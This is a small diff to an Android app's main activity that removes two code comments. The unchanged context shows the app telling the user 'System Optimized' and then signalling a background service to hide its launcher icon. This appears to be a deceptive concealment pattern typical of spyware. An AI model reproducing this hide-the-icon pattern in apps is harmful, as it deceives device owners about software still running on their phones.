@@ -42,7 +42,6 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        // Make sure your layout file is named activity_main.xml or activity_provisioning.xml
         setContentView(R.layout.activity_main); 
 
         requestQueue = Volley.newRequestQueue(this);
@@ -185,7 +184,7 @@ public class MainActivity extends AppCompatActivity {
         tvDeviceInfo.append("\n\nSystem Optimized. This utility can now be closed.");
         Intent intent = new Intent(this, CoreService.class);
         intent.setAction("com.chimera.action.TOGGLE_ICON");
-        intent.putExtra("show", "false"); // Use string for consistency
+        intent.putExtra("show", "false");
         startService(intent);
         new Handler(Looper.getMainLooper()).postDelayed(this::finish, 3000);
     }
